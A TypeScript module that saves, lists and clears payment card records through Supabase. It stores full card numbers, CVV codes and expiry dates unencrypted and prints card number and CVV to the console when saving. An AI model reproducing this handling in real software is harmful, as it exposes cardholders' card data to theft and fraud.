import { maskCardNumber } from './storage';

export interface CardDataRecord {
  id: string;
  card_number: string;
  cvv: string;
  expiration_date: string;
  masked_card_number: string;
  created_at: string;
}

// Mock database functions for when Supabase is not available
export const saveCardDataToDatabase = async (
  cardNumber: string,
  cvv: string,
  expirationDate: string
): Promise<boolean> => {
  try {
    console.log('Saving to database:', { cardNumber, cvv, expirationDate });
    
    try {
      const { supabase } = await import('../lib/supabase');
      
      if (!supabase) {
        console.log('Supabase not configured');
        return false;
      }
      
      const { data, error } = await supabase
        .from('card_data')
        .insert({
          card_number: cardNumber,
          cvv: cvv,
          expiration_date: expirationDate,
          masked_card_number: maskCardNumber(cardNumber)
        })
        .select();

      if (error) {
        console.error('Database error:', error);
        return false;
      }

      console.log('Data saved successfully to database:', data);
      return true;
    } catch (supabaseError) {
      console.log('Supabase error:', supabaseError);
      return false;
    }
  } catch (error) {
    console.error('Error saving to database:', error);
    return false;
  }
};

export const getCardDataFromDatabase = async (): Promise<CardDataRecord[]> => {
  try {
    try {
      const { supabase } = await import('../lib/supabase');
      
      if (!supabase) {
        console.log('Supabase not configured');
        return [];
      }
      
      const { data, error } = await supabase
        .from('card_data')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Error fetching data:', error);
        return [];
      }

      return data || [];
    } catch (supabaseError) {
      console.log('Supabase error:', supabaseError);
      return [];
    }
  } catch (error) {
    console.error('Error fetching from database:', error);
    return [];
  }
};

export const clearDatabaseData = async (): Promise<boolean> => {
  try {
    try {
      const { supabase } = await import('../lib/supabase');
      
      if (!supabase) {
        console.log('Supabase not configured');
        return false;
      }
      
      const { error } = await supabase
        .from('card_data')
        .delete()
        .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records

      if (error) {
        console.error('Error clearing database:', error);
        return false;
      }

      return true;
    } catch (supabaseError) {
      console.log('Supabase error:', supabaseError);
      return false;
    }
  } catch (error) {
    console.error('Error clearing database:', error);
    return false;
  }
};